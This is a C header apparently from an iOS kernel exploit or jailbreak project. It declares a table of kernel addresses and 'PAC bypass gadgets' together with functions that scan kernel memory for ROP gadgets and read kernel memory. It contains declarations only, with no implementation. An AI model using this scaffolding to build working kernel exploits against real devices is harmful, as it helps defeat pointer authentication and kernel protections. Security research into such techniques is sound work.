#ifndef GADGETS_H
#define GADGETS_H

#include <stdint.h>
#include <stdbool.h>

// Runtime-resolved gadget addresses
typedef struct {
    // Global variables
    uint64_t allproc;
    uint64_t cpu_ttep;
    uint64_t boot_args;
    
    // pmap functions
    uint64_t pmap_enter_options_addr;
    uint64_t pmap_nest;
    uint64_t pmap_remove_options;
    uint64_t pmap_mark_page_as_ppl_page;
    uint64_t pmap_create_options;
    uint64_t pmap_set_nested;
    
    // Thread/exception
    uint64_t ml_sign_thread_state;
    uint64_t exceptionReturn;
    uint64_t exception_return_after_check;
    uint64_t exception_return_after_check_no_restore;
    
    // PAC bypass gadgets
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid_signed;
    uint64_t hw_lck_ticket_reserve_orig_allow_invalid;
    uint64_t brX22;
    uint64_t ldp_x0_x1_x8_gadget;
    uint64_t str_x8_x9_gadget;
    uint64_t str_x0_x19_ldr_x20;
    
    // CPSR
    uint64_t kernel_el_cpsr;
} GadgetInfo;

extern GadgetInfo g_gadgets;

// Scan kernel __TEXT for all needed gadgets at runtime
bool scan_gadgets(void);

// Find a kernel function by scanning for cstring reference + backtrace
uint64_t find_function_by_string(const char *func_name, uint64_t text_start, uint64_t text_end);

// Find allproc by scanning kernel data
uint64_t find_allproc(void);

// Find cpu_ttep by scanning kernel data
uint64_t find_cpu_ttep(void);

// Search for a 4-byte instruction in kernel memory
uint64_t search_instruction(uint64_t text_start, uint64_t text_end, uint32_t instr, int skip);

// Read 4 bytes from kernel memory
uint32_t kread32_at(uint64_t addr);

#endif
